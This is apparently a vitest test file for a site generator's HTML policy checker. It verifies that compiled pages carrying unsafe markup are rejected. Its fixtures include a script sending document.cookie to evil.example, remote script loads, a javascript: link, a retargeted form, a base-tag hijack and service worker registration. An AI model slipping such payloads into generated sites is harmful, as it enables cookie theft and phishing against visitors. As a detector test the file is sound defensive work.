import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  describeMarkupPolicyViolations,
  injectCalCom,
  injectLeadCapture,
  siteMarkupPolicy,
  type FileMap,
} from '@flowstarter/agentic-codegen';
import { findMarkupViolationsInDir } from '../src/output-markup';

const temporaryDirectories: string[] = [];

afterEach(async () => {
  await Promise.all(
    temporaryDirectories
      .splice(0)
      .map((directory) => rm(directory, { recursive: true, force: true })),
  );
});

const PLATFORM_ORIGIN = 'https://flowstarter.dev';
const POLICY = siteMarkupPolicy({ platformOrigins: [PLATFORM_ORIGIN] });

/**
 * A page shaped like the ones the templates actually compile to: the layout's
 * inline bootstrap, the bundle under `_astro/`, the webfont stylesheet, and
 * whatever `body` the test is about.
 */
function page(body: string): string {
  return [
    '<!doctype html><html lang="en"><head>',
    '<meta charset="UTF-8" />',
    '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish" />',
    "<script>document.documentElement.classList.add('js');</script>",
    '<title>Calm Path</title>',
    '</head><body>',
    body,
    '<script type="module" src="/_astro/page.Bd1f9a.js"></script>',
    '</body></html>',
  ].join('\n');
}

/** A compiled site with one page per entry, plus a plausible bundle. */
async function dist(pages: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'flowstarter-markup-dist-'));
  temporaryDirectories.push(root);
  await mkdir(join(root, '_astro'), { recursive: true });
  await writeFile(
    join(root, '_astro', 'page.Bd1f9a.js'),
    'document.querySelector(".header__menu-btn")?.addEventListener("click",()=>{});',
    'utf8',
  );
  await writeFile(join(root, '_astro', 'site.css'), 'body{margin:0}', 'utf8');
  for (const [path, body] of Object.entries(pages)) {
    const file = join(root, path);
    await mkdir(join(file, '..'), { recursive: true });
    await writeFile(file, page(body), 'utf8');
  }
  return root;
}

/** The real blocks the injectors write, not a hand-copied imitation. */
function managedContactPage(): string {
  const files: FileMap = {
    'contact/index.html':
      '<main class="contact-page"><h1>Contact</h1>' +
      '<form data-contact-form action="mailto:hello@calmpath.example"></form>' +
      '<div class="contact-page__lead-capture" data-flowstarter-lead-capture-slot></div>' +
      '</main>',
  };
  const withCapture = injectLeadCapture(
    files,
    `${PLATFORM_ORIGIN}/api/leads/capture/pub_tok_123`,
  );
  const withBooking = injectCalCom(
    withCapture,
    'https://cal.com/calmpath/45min',
  );
  return withBooking['contact/index.html']!;
}

describe('findMarkupViolationsInDir', () => {
  it('passes a build that carries only what the platform put there', async () => {
    const root = await dist({
      'index.html': '<h1>Calm Path</h1><a href="/contact">Contact</a>',
      'contact/index.html': managedContactPage(),
      'about/index.html':
        '<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=1"></iframe>',
    });
    expect(await findMarkupViolationsInDir(root, POLICY)).toEqual([]);
  });

  it.each([
    [
      'an inline script',
      '<script>fetch("https://evil.example/x?c="+document.cookie)</script>',
      'script-inline',
      'runs inline JavaScript',
    ],
    [
      'an external script',
      '<script src="https://evil.example/c.js"></script>',
      'script-src',
      'an origin the site may not use',
    ],
    [
      'an inline event handler',
      '<img src="/hero.webp" onerror="import(\'https://evil.example/c.js\')">',
      'event-handler',
      'inline event handler onerror',
    ],
    [
      'a javascript: link',
      '<a href="javascript:alert(1)">Book</a>',
      'executable-url',
      'a URL scheme that executes',
    ],
    [
      'an iframe',
      '<iframe src="https://evil.example/phish"></iframe>',
      'embedded-frame',
      'not the managed booking embed',
    ],
    [
      'a meta refresh',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      'meta-refresh',
      'without a click',
    ],
    [
      'a base tag',
      '<base href="https://evil.example/">',
      'base-tag',
      'rewrites every relative URL',
    ],
    [
      'a retargeted contact form',
      '<form action="https://evil.example/collect"><input name="email"></form>',
      'form-action',
      "neither the client's own lead-capture endpoint",
    ],
    [
      'an external stylesheet',
      '<link rel="stylesheet" href="https://evil.example/s.css">',
      'external-stylesheet',
      'loads a stylesheet from',
    ],
    [
      'a service worker registration',
      '<script>navigator.serviceWorker.register("/sw.js")</script>',
      'service-worker',
      'registers a service worker',
    ],
  ])(
    'fails a build carrying %s, naming the file and the element',
    async (_name, body, rule, phrase) => {
      const root = await dist({
        'index.html': '<h1>Calm Path</h1>',
        'services/index.html': body,
      });
      const violations = await findMarkupViolationsInDir(root, POLICY);
      expect(violations.map((violation) => violation.rule)).toContain(rule);
      const offending = violations.find(
        (violation) => violation.rule === rule,
      )!;
      expect(offending.path).toBe('services/index.html');

      const message = describeMarkupPolicyViolations(violations);
      expect(message).toContain('GENERATED_HTML_UNSAFE');
      expect(message).toContain('services/index.html');
      expect(message).toContain(phrase);
    },
  );

  it('fails a service worker hidden in a compiled bundle', async () => {
    const root = await dist({ 'index.html': '<h1>Calm Path</h1>' });
    await writeFile(
      join(root, '_astro', 'page.Bd1f9a.js'),
      'navigator.serviceWorker.register("/sw.js");',
      'utf8',
    );
    const violations = await findMarkupViolationsInDir(root, POLICY);
    expect(violations).toHaveLength(1);
    expect(violations[0]!.path).toBe('_astro/page.Bd1f9a.js');
    expect(violations[0]!.rule).toBe('service-worker');
  });

  it('reports every offending page, sorted, so the log is readable', async () => {
    const root = await dist({
      'index.html': '<script>alert(1)</script>',
      'about/index.html': '<base href="https://evil.example/">',
      'contact/index.html': '<form action="https://evil.example"></form>',
    });
    const violations = await findMarkupViolationsInDir(root, POLICY);
    expect(violations.map((violation) => violation.path)).toEqual([
      'about/index.html',
      'contact/index.html',
      'index.html',
    ]);
  });

  it('says nothing about an empty directory', async () => {
    const root = await mkdtemp(join(tmpdir(), 'flowstarter-markup-empty-'));
    temporaryDirectories.push(root);
    expect(await findMarkupViolationsInDir(root, POLICY)).toEqual([]);
  });
});
